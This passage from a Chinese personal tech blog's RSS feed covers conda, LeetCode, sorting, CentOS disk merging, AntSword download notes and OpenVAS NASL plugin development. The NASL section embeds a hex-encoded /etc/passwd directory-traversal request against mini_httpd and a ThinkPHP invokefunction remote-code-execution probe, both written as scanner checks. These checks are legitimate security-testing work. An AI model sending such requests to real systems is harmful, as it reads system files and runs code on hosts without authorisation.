id="5、删除一个已有的虚拟环境"><a href="#5、删除一个已有的虚拟环境" class="headerlink" title="5、删除一个已有的虚拟环境"></a>5、删除一个已有的虚拟环境</h3><pre><code>conda remove --name your_env_name --all</code></pre><h3 id="6、查看pip的安装目录"><a href="#6、查看pip的安装目录" class="headerlink" title="6、查看pip的安装目录"></a>6、查看pip的安装目录</h3><pre><code>pip list</code></pre><p>7、删除已经安装的模块<br> <code>pip uninstall **</code><br> (例如：pip uninstall numpy)</p><p>pycharm配置虚拟环境</p><p><img src="/2021/04/26/machine-learning-classify-knn/1622551543337.png" alt="1622551543337"></p><h1 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h1><p>1 cross_validation等模块弃用</p><p>新的模块sklearn.model_selection，将以前的<code>sklearn.cross_validation</code>, <code>sklearn.grid_search</code> 和 <code>sklearn.learning_curve模块组合到一起</code></p><p>比如：cross_validation模块弃用，所有的包和方法都在model_selection中,包和方法名没有发生变化</p><p>将from sklearn import cross_validation</p><p>改为from sklearn import model_selection</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</category>
      
      
      <comments>https://m01ly.github.io/2021/04/26/machine-learning-classify-knn/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>openvas插件开发</title>
      <link>https://m01ly.github.io/2021/04/07/openvas-develop/</link>
      <guid>https://m01ly.github.io/2021/04/07/openvas-develop/</guid>
      <pubDate>Wed, 07 Apr 2021 09:33:00 GMT</pubDate>
      
      <description>&lt;p&gt;openvas插件开发&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>openvas插件开发<a id="more"></a></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@archery-sec9001 supper-user<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># openvas-nasl -h</span>Usage:  openvas-nasl <span class="token punctuation">[</span>OPTION<span class="token punctuation">..</span>.<span class="token punctuation">]</span> NASL_FILE<span class="token punctuation">..</span>. - standalone NASL interpreter <span class="token keyword">for</span> OpenVASHelp Options:  -h, --help                          Show <span class="token function">help</span> optionsApplication Options:  -V, --version                       Display version information  -d, --debug                         Output debug information to stderr.  -D, --description                   Only run the <span class="token string">'description'</span> part of the script  -B, --both                          Run <span class="token keyword">in</span> description mode before running the script.  -p, --parse                         Only parse the script, don<span class="token string">'t execute it  -L, --lint                          '</span>lint<span class="token string">' the script (extended checks)  -t, --target=&lt;target>               Execute the scripts against &lt;target>  -T, --trace=&lt;file>                  Log actions to &lt;file> (or '</span>-<span class="token string">' for stderr)  -c, --config-file=&lt;filename>        Configuration file  -e, --source-iface=&lt;iface_name>     Source network interface for established connections.  --vendor-version=&lt;string>           Use &lt;string> as vendor version.  -s, --safe                          Specifies that the script should be run with '</span>safe checks' enabled  -X, --disable-signing               Run the script with disabled signature verification  -i, --include-dir<span class="token operator">=</span><span class="token operator">&lt;</span>dir<span class="token operator">></span>             Search <span class="token keyword">for</span> includes <span class="token keyword">in</span> <span class="token operator">&lt;</span>dir<span class="token operator">></span>  --debug-tls<span class="token operator">=</span><span class="token operator">&lt;</span>level<span class="token operator">></span>                 Enable TLS debugging at <span class="token operator">&lt;</span>level<span class="token operator">></span>  -k, --kb<span class="token operator">=</span><span class="token operator">&lt;</span>key<span class="token operator">=</span>value<span class="token operator">></span>                Set KB key to value. Can be used multiple <span class="token function">times</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo.nasl：输出开放的端口</p><pre><code>## Check for ssh#if(description)&#123;        script_name(english:&quot;Ensure the presence of ssh&quot;);        script_description(english:&quot;This script makes sure that ssh is running&quot;);        script_summary(english:&quot;connects on remote tcp port 22&quot;);        script_category(ACT_GATHER_INFO);        script_family(english:&quot;Administration toolbox&quot;);        script_copyright(english:&quot;This script was written by Joe U.&quot;);        script_dependencies(&quot;find_service.nes&quot;);        exit(0);&#125;#start = prompt(&quot;First port to scan ? &quot;);#end  = prompt(&quot;Last port to scan ? &quot;);for(i=1;i&lt;9999;i=i+1)&#123;        soc = open_sock_tcp(i);        if(soc)        &#123;                display(&quot;Port &quot;, i, &quot; is open\n&quot;);                close(soc);        &#125;&#125;</code></pre><h4 id="Tcp请求"><a href="#Tcp请求" class="headerlink" title="Tcp请求"></a>Tcp请求</h4><pre><code>#漏洞检测## Variable Initializationport = 8080;#mini_httpd默认端口## Check Port statusif(!get_port_state(port))&#123;        #这里经过测试一些未开放的端口返回值都是1，如果开放的话返回值就是10000，所以这里其实就可以根据这个返回值做端口检测    display(&quot;ADog:get_port_state failed.&quot;,port,&quot;\n&quot;);    exit(0);&#125;## Open the socketsock = open_sock_tcp(port);if(!sock)&#123;        #这里其实跟上面是一样的，sock端口其实都能开放的，所以这段可写可不写    display(&quot;ADog:open_sock_tcp failed.&quot;,port,&quot;\n&quot;);    exit(0);&#125;## Constructed directory traversal crafted requestreq = raw_string(0x47, 0x45, 0x54, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x0d, 0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x4d, 0x61, 0x63, 0x69, 0x6e, 0x74, 0x6f, 0x73, 0x68, 0x3b, 0x20, 0x49, 0x6e, 0x74, 0x65, 0x6c, 0x20, 0x4d, 0x61, 0x63, 0x20, 0x4f, 0x53, 0x20, 0x58, 0x20, 0x31, 0x30, 0x2e, 0x31, 0x33, 0x3b, 0x20, 0x72, 0x76, 0x3a, 0x36, 0x33, 0x2e, 0x30, 0x29, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x2f, 0x32, 0x30, 0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x20, 0x46, 0x69, 0x72, 0x65, 0x66, 0x6f, 0x78, 0x2f, 0x36, 0x33, 0x2e, 0x30, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x6d, 0x6c, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x2a, 0x2f, 0x2a, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x7a, 0x68, 0x2d, 0x43, 0x4e, 0x2c, 0x7a, 0x68, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x2c, 0x7a, 0x68, 0x2d, 0x54, 0x57, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x37, 0x2c, 0x7a, 0x68, 0x2d, 0x48, 0x4b, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x35, 0x2c, 0x65, 0x6e, 0x2d, 0x55, 0x53, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x33, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x32, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65, 0x0d, 0x0a, 0x55, 0x70, 0x67, 0x72, 0x61, 0x64, 0x65, 0x2d, 0x49, 0x6e, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x2d, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x73, 0x3a, 0x20, 0x31, 0x0d, 0x0a, 0x0d, 0x0a);#这里最重要的就是这段poc，由于这是web服务器，因此这的payload，读者可以对这段进行16进制解码，你就会发现其实就是一个web的流量包#这里我先使用burp做了漏洞复现，然后将请求包复制下来，将其做了一次16进制转化#这里openvas其实自带http的函数，但是这里我仍然使用了socket，原因就是如果后续不是web的服务，那么web相关的函数就用不了，总的来说socket肯定是最通用的方法## send the attack request and recieve the responsedisplay(&quot;ADog:port is working.&quot;,port,&quot;\n&quot;);send(socket:sock, data:req);ret = recv(socket:sock, length:1024);#获取返回包内容close(sock);#display(&quot;ADog:recv:&quot;,ret);state = egrep(pattern:&#39;^root.*&#39;,string:ret);#openvas自带的匹配函数，这里用于匹配出现root字样，由于这个漏洞是任意文件读取，那么这里我读取的是/etc/passwd，那么就会第一条就会出现root用户的基本信息#那么如果出现了，那么就认定此漏洞存在#这里的定制化就体现在我们可以针对公司内部漏洞编写nasl脚本，其实仔细看过脚本的人就知道，目前市面上主流的扫描器其实都只是版本匹配，当然这也是为了无损扫描，也有部分payload是真的带pocif(state)&#123;  report = &#39;mini_httpd is vulnerable!\n&#39;;  security_message(data:report);  #这里使用openvas自带的报告函数将漏洞输出到扫描报告里  #security_message(port:port);  #这两个函数用一个就行了，一开始为了测试使用了这两个，最后报告里也就出现了两次  display(&#39;mini_httpd is vulnerable.\n&#39;);&#125;</code></pre><p><a href="http://foreversong.cn/archives/1333">http://foreversong.cn/archives/1333</a></p><h4 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h4><pre><code># 获取 www 端口，默认为 80port = get_http_port(default: 80);str = string(&quot;GET /index.php?s=index/think/app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Tr0y HTTP/1.0\r\n\r\n&quot;);# 发送 payload 并返回服务器的响应recv = http_send_recv(port: port, data: str);# DEBUG 使用，打印返回的 header+bodydisplay(recv, &quot;\n&quot;);</code></pre><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>-X 忽略签名认证</p><p>-t target 目标主机IP/域名</p><p>-i 插件加载目录</p><pre class="line-numbers language-bash"><code class="language-bash">openvas-nasl -i /var/lib/openvas/plugins -Xt 10.27.22.76 demo2.nasl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/07/openvas-develop/1617788073176.png" alt="1617788073176"></p><h4 id="7-测试NASL脚本"><a href="#7-测试NASL脚本" class="headerlink" title="7. 测试NASL脚本"></a>7. 测试NASL脚本</h4><p>将自己写的插件复制到openvas插件库目录：<br>/var/lib/openvas/plugins<br>加载插件:<br>openvassd</p><h4 id="8-重建插件库"><a href="#8-重建插件库" class="headerlink" title="8. 重建插件库"></a>8. 重建插件库</h4><p>openvasmd –rebuild<br>注意：参数“rebuild”代表从一个正在运行的扫描器（openvassd）中重建数据库信息。</p><p>http请求：</p><pre><code>port = get_http_port(default:80);  host = http_host_name(port:port);  recv = http_get(port:port, item:&quot;/&quot;);  display(recv,&quot;\n&quot;);  </code></pre><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/81149159">nasl插件详解</a></p><p><a href="http://books.gigatux.nl/mirror/networksecuritytools/0596007949/toc.html">nessus的nasl脚本手册</a></p><p><a href="http://michel.arboi.free.fr/nasl2ref/nasl2_reference.pdf">nasl官方手册</a></p><p><a href="http://nasl.homemoon.top/index.html">nasl插件开发手册-翻译版</a>  比较全</p><p><a href="http://nasl.homemoon.top/index.html">Nessus安全测试插件编写教程</a>     入门教程</p><h4 id="识别nginx的插件"><a href="#识别nginx的插件" class="headerlink" title="识别nginx的插件"></a>识别nginx的插件</h4><p>插件脚本：</p><pre><code>################################################################################ OpenVAS Vulnerability Test## Nginx version page## Authors:# molly.zhang &lt;molly.zhang@alussinan.org&gt;## Copyright:# Copyright (C) 2021 molly zhang## This program is free software; you can redistribute it and/or modify# it under the terms of the GNU General Public License version 2,# as published by the Free Software Foundation## This program is distributed in the hope that it will be useful,# but WITHOUT ANY WARRANTY; without even the implied warranty of# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the# GNU General Public License for more details.## You should have received a copy of the GNU General Public License# along with this program; if not, write to the Free Software# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.###############################################################################if(description)&#123;  script_oid(&quot;1.3.6.1.4.1.56487.1.0.75984&quot;);  script_version(&quot;2021-04-24T15:18:35+0000&quot;);  script_tag(name:&quot;last_modification&quot;, value:&quot;2021-05-08 15:18:35 +0000 (Sat, 08 May 2021)&quot;);  script_tag(name:&quot;creation_date&quot;, value:&quot;2021-05-08 14:08:04 +0100 (Sat, 08 May 2021)&quot;);  script_tag(name:&quot;cvss_base_vector&quot;, value:&quot;AV:N/AC:L/Au:N/C:N/I:N/A:N&quot;);  script_tag(name:&quot;cvss_base&quot;, value:&quot;5.3&quot;);  script_name(&quot;Nginx version&quot;);  script_category(ACT_GATHER_INFO);  script_copyright(&quot;Copyright (C)：mengli.zhang in 20210507&quot;);  script_family(&quot;MyNVTS&quot;);  script_dependencies(&quot;find_service.nasl&quot;, &quot;httpver.nasl&quot;, &quot;global_settings.nasl&quot;);  script_require_ports(&quot;Services/www&quot;, 80);  script_exclude_keys(&quot;Settings/disable_cgi_scanning&quot;);  script_add_preference(name:&quot;Show full HTTP headers in output&quot;, type:&quot;checkbox&quot;, value:&quot;no&quot;, id:1);  script_tag(name:&quot;summary&quot;, value:&quot;This script detects and reports the Nginx&#39;s Version.&quot;);  script_tag(name:&quot;qod_type&quot;, value:&quot;remote_banner&quot;);  exit(0);&#125;display(&quot;Hello World .\n&quot;);display(&quot;Hello World openvas-nasl. \n&quot;);include(&#39;/var/lib/openvas/plugins/http_func.inc&#39;);include(&#39;/var/lib/openvas/plugins/global_settings.inc&#39;);#display(default:80,&quot;\n&quot;);#port = get_http_port(default:80);#host = http_host_name(port:port);display(&quot;start#########\n&quot;);#display(host,&quot;\n&quot;);#recv = http_send_recv(port: port, data: str);#str = string(&quot;GET /index.php HTTP/1.0\r\n\r\n&quot;);str = string(&quot;GET / HTTP/1.0\r\n\r\n&quot;);recv = http_send_recv(port: &quot;80&quot;,data:str);display(recv, &quot;\n&quot;);state = egrep(pattern:&#39;nginx.*&#39;,string:recv);display(&quot;state:&quot;,state);if(state)&#123;  display(&#39;nginx version xielou\n&#39;);&#125;exit( 0 );</code></pre><p> openvasmd –rebuild –progress </p><p>测试：</p><pre><code>openvas-nasl -Xt 10.27.22.76 nginx_version.nasl</code></pre><pre><code>docker exec -it 337e5d6c9854 bashcd /usr/local/var/lib/openvas/pluginsvim nginx_version.naslcat nginx_version.naslopenvas-nasl -Xt 10.27.22.76 nginx_version.nasl</code></pre><p>[root@archery-sec9002 supper-user]# docker restart 337e5d6c9854</p><p>重启openvas</p><pre><code>#加载插件openvassd#### 8. 重建插件库openvasmd –rebuild#失败　　这一步成功会在/usr/local/var/cache/openvas 中生成.nvti 文件因为openvasmd，gvmd自GVM-10起，它已重命名为：gvmd，并且openvas-check-setup已弃用且无用。gvmd --rebuild-scap=ovaldefsdocker restart 337e5d6c9854</code></pre><p>sudo service openvas-manager restart; </p><p>sudo service openvas-scanner restart; </p><p>sudo openvasmd –rebuild –progress </p><p>family=”Web application abuses”</p><p>family=”MyNVTs”</p><p>family=”Policy”</p><p>greenbone-nvt-sync –rsync     #greenbone-nvt-sync –curl<br>greenbone-scapdata-sync –rsync</p><p>greenbone-certdata-sync –rsync</p><p>查看日志：</p><p>cat /usr/local/var/log/gvm/openvassd.log</p><p>cat /usr/local/var/log/gvm/gvmd.log</p><p>docker查看日志</p><p>[root@archery-sec9002 supper-user]# docker logs openvas0127</p><p>可以通过运行以下命令来查看/ var / log / gvm / *中的所有日志：</p><pre><code>docker logs openvas</code></pre><p><img src="/2021/04/07/openvas-develop/1620456185130.png" alt="1620456185130"></p><pre><code>md   main:MESSAGE:2021-05-08 03h28.04 utc:32273:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)md   main:WARNING:2021-05-08 03h28.04 utc:32273: main: Main process is already runningmd   main:MESSAGE:2021-05-08 03h29.24 utc:32318:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)md manage:   INFO:2021-05-08 03h29.24 utc:32318:    Rebuilding SCAP data (ovaldefs).md manage:WARNING:2021-05-08 03h29.26 utc:32318: sql_prepare_internal: sqlite3_prepare failed: no such column: idmd manage:WARNING:2021-05-08 03h29.26 utc:32318: sqlv: sql_prepare_internal failedmd   main:MESSAGE:2021-05-08 03h32.42 utc:15:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)md   main:   INFO:2021-05-08 03h32.42 utc:15:    Migrating database.md   main:WARNING:2021-05-08 03h32.42 utc:15: main: databases are already at the supported versionmd   main:MESSAGE:2021-05-08 03h32.42 utc:17:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)md manage:   INFO:2021-05-08 03h32.42 utc:17:    Getting users.md   main:MESSAGE:2021-05-08 03h33.48 utc:26:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)util gpgme:MESSAGE:2021-05-08 03h33.48 utc:27: Setting GnuPG dir to &#39;/usr/local/var/lib/gv</code></pre><p>greenbone-nvt-sync –help</p><p>greenbone-nvt-sync –refresh</p><p>gvmd -h</p><p>openvassd -h</p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/04/07/openvas-develop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>leetcode每日一题</title>
      <link>https://m01ly.github.io/2021/04/06/leetcode-daily/</link>
      <guid>https://m01ly.github.io/2021/04/06/leetcode-daily/</guid>
      <pubDate>Tue, 06 Apr 2021 07:25:40 GMT</pubDate>
      
      <description>&lt;p&gt;每日一题的leetcode&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>每日一题的leetcode<a id="more"></a></p><h3 id="删除有序数组重复项II"><a href="#删除有序数组重复项II" class="headerlink" title="删除有序数组重复项II"></a>删除有序数组重复项II</h3><p><strong>题目描述：</strong></p><p>给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 只出现一次 ，返回删除后数组的新长度。</p><p>不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。</p><p><strong>示例 1：</strong></p><p>输入：nums = [1,1,2]<br>输出：2, nums = [1,2]<br>解释：函数应该返回新的长度 2 ，并且原数组 nums 的前两个元素被修改为 1, 2 。不需要考虑数组中超出新长度后面的元素。</p><p><strong>解题思路：</strong></p><p>因为本体不能额外申请数组空间，因此很容易想到需要一个指针来记录满足条件的位置，一个指针用于遍历数组，因此本题采用双指针很容易做出来。</p><p>慢指针 slow : 指向当前即将放置元素的位置；则 slow - 1 是刚才已经放置了元素的位置。<br>快指针 fast : 向后遍历所有元素；<br>因为最多允许两个重复元素，并且 slow - 2 位置是上上次放置了元素的位置，所以让 nums[fast] 跟 nums[slow - 2] 进行比较。每次都是只允许最多两个元素出现重复，这两个元素的位置在 slow - 1 和 slow - 2。</p><p><strong>思路：</strong>慢指针即满足题目条件的最大索引（最后满足条件数组的长度），快指针用于遍历数组；这里可以想象慢指针指向的是一个新的数组，我们只需要关心慢指针什么时候增加满足条件的元素，即不重复两次的元素，即nums[slow-2]!=nums[fast]；若满足，则添加新元素nums[slow]=nums[fast]，指针后移slow=slow+1。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#不重复两次的元素class Solution(object):</span>    <span class="token keyword">def</span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        slow<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> fast <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>slow<span class="token operator">&lt;</span><span class="token number">2</span> <span class="token operator">or</span> nums<span class="token punctuation">[</span>slow<span class="token number">-2</span><span class="token punctuation">]</span><span class="token operator">!=</span>nums<span class="token punctuation">[</span>fast<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不重复两次的元素</span>                nums<span class="token punctuation">[</span>slow<span class="token punctuation">]</span><span class="token operator">=</span>nums<span class="token punctuation">[</span>fast<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#</span>                slow<span class="token operator">=</span>slow<span class="token operator">+</span><span class="token number">1</span><span class="token comment" spellcheck="true">#指针后移</span>        <span class="token keyword">return</span> slow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考：<a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/">https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2021/04/06/leetcode-daily/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>渗透测试工具之蚁剑</title>
      <link>https://m01ly.github.io/2021/03/30/pt-antSword/</link>
      <guid>https://m01ly.github.io/2021/03/30/pt-antSword/</guid>
      <pubDate>Tue, 30 Mar 2021 06:58:08 GMT</pubDate>
      
      <description>&lt;p&gt;首先蚁剑的下载地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/AntSwordProject/antSword&quot;&gt;https://github.com/AntSwordProject/antSword&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其次需要注意：&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>首先蚁剑的下载地址：</p><p><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><p>其次需要注意：<a id="more"></a></p><p>在GitHub下载时需要下载两个部分：</p><p>一个是项目核心源码（AntSword），另一个是加载器（AntSword-Loader）；</p><p>加载器则分为三个版本：Mac、Windows、Linux。</p><p>核心源码：</p><p>这个其实就是运行加载其中的exe文件后，选择了工作目录后下载到工作目录里面的zip文件。</p><p>也可以自己去github下载<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a><br>————————————————<br>版权声明：本文为CSDN博主「Ahuuua」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/Ahuuua/article/details/109034528">https://blog.csdn.net/Ahuuua/article/details/109034528</a></p><p><img src="/2021/03/30/pt-antSword/1617087539177.png" alt="1617087539177"></p><p>工作目录可以选择antSword-master，然后加载代码成功，手动重启即可。</p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/03/30/pt-antSword/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>排序算法</title>
      <link>https://m01ly.github.io/2021/03/29/leetcode-sort/</link>
      <guid>https://m01ly.github.io/2021/03/29/leetcode-sort/</guid>
      <pubDate>Mon, 29 Mar 2021 12:19:30 GMT</pubDate>
      
      <description>&lt;p&gt;排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。<a id="more"></a></p><p>用一张图概括： </p><p> <img src="/2021/03/29/leetcode-sort/1617020746261.png" alt="1617020746261"> </p><h2 id="术语铺垫"><a href="#术语铺垫" class="headerlink" title="术语铺垫"></a>术语铺垫</h2><p>有些人可能不知道什么是稳定排序、原地排序、时间复杂度、空间复杂度，我这里先简单解释一下：</p><p>1、稳定排序：如果 a 原本在 b 的前面，且 a == b，排序之后 a 仍然在 b 的前面，则为稳定排序。</p><p>2、非稳定排序：如果 a 原本在 b 的前面，且 a == b，排序之后 a 可能不在 b 的前面，则为非稳定排序。</p><p>3、原地排序：原地排序就是指在排序过程中不申请多余的存储空间，只利用原来存储待排数据的存储空间进行比较和交换的数据排序。</p><p>4、非原地排序：需要利用额外的数组来辅助排序。</p><p>5、时间复杂度：一个算法执行所消耗的时间。</p><p>6、空间复杂度：运行完一个算法所需的内存大小。</p><p>关于时间复杂度</p><p>平方阶 (O(n2)) 排序 各类简单排序：直接插入、直接选择和冒泡排序。</p><p>线性对数阶 (O(nlog2n)) 排序 快速排序、堆排序和归并排序；</p><p>O(n1+§)) 排序，§ 是介于 0 和 1 之间的常数。 希尔排序</p><p>线性阶 (O(n)) 排序 基数排序，此外还有桶、箱排序。</p><p>关于稳定性</p><p>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序。</p><p>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序。</p><p>名词解释：</p><ul><li>n：数据规模</li><li>k：”桶”的个数</li><li>In-place：占用常数内存，不占用额外内存</li><li>Out-place：占用额外内存</li><li>稳定性：排序后 2 个相等键值的顺序和排序之前它们的顺序相同</li></ul><p>1  冒泡排序</p><p><a href="https://zhuanlan.zhihu.com/p/57088609">https://zhuanlan.zhihu.com/p/57088609</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2021/03/29/leetcode-sort/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>centos7把/mnt空间合并到/(根目录)</title>
      <link>https://m01ly.github.io/2021/03/11/linux-disk/</link>
      <guid>https://m01ly.github.io/2021/03/11/linux-disk/</guid>
      <pubDate>Thu, 11 Mar 2021 07:17:19 GMT</pubDate>
      
      <description>&lt;p&gt;在使用虚拟机创建centos系统的时候,会发现原本打算分配的空间,有一部分给/mnt分配走了,这样就造成我们的根目录空间不够,所以我们要把/mnt分配走的空间还给根目录.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在使用虚拟机创建centos系统的时候,会发现原本打算分配的空间,有一部分给/mnt分配走了,这样就造成我们的根目录空间不够,所以我们要把/mnt分配走的空间还给根目录.</p><a id="more"></a><p>1.先查看空间分配情况</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">df</span> -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到整个硬盘近250G，但是根目录只用了50G，mnt目录用了197G。</p><p><img src="/2021/03/11/linux-disk/1615447144928.png" alt="1615447144928"></p><p>2.卸载/mnt分区</p><p>（1）#备份/mnt没东西可以不备份 </p><pre><code> tar cvf /tmp/mnt.tar /mnt  tar cvf /tmp/root.tar / </code></pre><p>（2）卸载mnt目录</p><p> # 记录一下 mnt下有多少可用空间  ，比如197G </p><pre><code>umount /mnt    #卸载/mnt，如果无法卸载，先终止使用/home文件系统的进程mount /dev/sdb1 /mntmount /dev/sdb1 /mnt</code></pre><p>（3）删除/mnt所在的lv</p><pre><code>lvremove /dev/sdb1</code></pre><p>接着会出现确认的内容，输入“y”，回车</p><p>Do you really want to remove active logical volume centos/home? [y/n]: y</p><p> Logical volume “home” successfully removed</p><p>（4）查看物理卷情况：查看剩余空间</p><pre><code>vgdisplay</code></pre><p> — Volume group —</p><p> VG Name        centos</p><p> System ID</p><p> Format        lvm2</p><p> Metadata Areas    1</p><p> Metadata Sequence No 5</p><p> VG Access       read/write</p><p> VG Status       resizable</p><p> MAX LV        0</p><p> Cur LV        2</p><p> Open LV        2</p><p> Max PV        0</p><p> Cur PV        1</p><p> Act PV        1</p><p> VG Size        &lt;59.00 GiB</p><p> PE Size        4.00 MiB</p><p> Total PE       15103</p><p> Alloc PE / Size    10473 / 40.91 GiB</p><p> Free PE / Size    4630 / &lt;18.09 GiB</p><p> VG UUID        